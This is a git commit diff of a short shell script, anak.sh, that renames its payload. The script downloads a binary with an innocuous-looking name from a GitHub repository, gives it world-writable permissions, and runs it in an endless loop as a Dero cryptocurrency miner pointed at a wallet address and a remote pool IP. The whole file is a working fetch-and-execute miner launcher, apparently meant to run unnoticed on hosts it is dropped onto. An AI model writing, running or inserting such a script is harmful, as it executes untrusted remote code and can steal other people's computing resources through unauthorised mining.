1a4f1e194c2b131bdb8465f83f4864fb68155f93
renilo <88342640+renilo@users.noreply.github.com>
2022-11-01 10:53:59 +0700

    Update anak.sh

--- anak.sh
+++ anak.sh
@@ -1,8 +1,7 @@
-wget https://github.com/renilo/kuuntul/raw/main/momon
-chmod 777 momon
+wget https://github.com/renilo/kuuntul/raw/main/manuk
+chmod 777 manuk
 
-#!/bin/bash
 while :; do
-    ./momon -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.Rig -r 170.187.197.220:443 -p stratum;
+    ./manuk -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4 -r 170.187.197.220:80;
     sleep 5;
 done
